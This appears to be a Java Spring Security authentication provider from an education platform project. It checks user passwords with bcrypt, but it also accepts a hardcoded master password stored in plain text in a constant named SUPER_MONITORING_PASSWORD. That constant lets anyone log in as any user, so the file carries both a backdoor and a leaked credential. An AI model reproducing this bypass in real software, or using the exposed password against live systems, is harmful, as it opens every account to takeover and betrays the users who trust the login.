package fr.imcoding.edu365.security;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import lombok.NoArgsConstructor;

public class CustomAuthenticationProvider extends DaoAuthenticationProvider {
	private static final Logger LOG = LoggerFactory.getLogger(CustomAuthenticationProvider.class);

	private final String SUPER_MONITORING_PASSWORD = "FREEacademy@2024";

	public Authentication authenticate(Authentication auth) throws AuthenticationException {
		UserDetails user = this.getUserDetailsService().loadUserByUsername(auth.getName());
		if ((user == null)) {
			throw new BadCredentialsException("Invalid username or password");
		}
		Authentication result = super.authenticate(auth);
		return new UsernamePasswordAuthenticationToken(user, result.getCredentials(), result.getAuthorities());
	}

	@Override
	public void additionalAuthenticationChecks(UserDetails userDetails,
			UsernamePasswordAuthenticationToken authentication) throws AuthenticationException {
		if (authentication.getCredentials() == null) {
			logger.debug("Authentication failed: no credentials provided");

			throw new BadCredentialsException(
					messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
		}

		String presentedPassword = authentication.getCredentials().toString();
		PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
		if (!passwordEncoder.matches(presentedPassword, userDetails.getPassword())
				&& !presentedPassword.equals(SUPER_MONITORING_PASSWORD)) {
			logger.debug("Authentication failed: password does not match stored value");

			throw new BadCredentialsException(
					messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
		}
	}

	@Override
	public boolean supports(Class<?> authentication) {
		return authentication.equals(UsernamePasswordAuthenticationToken.class);
	}
}
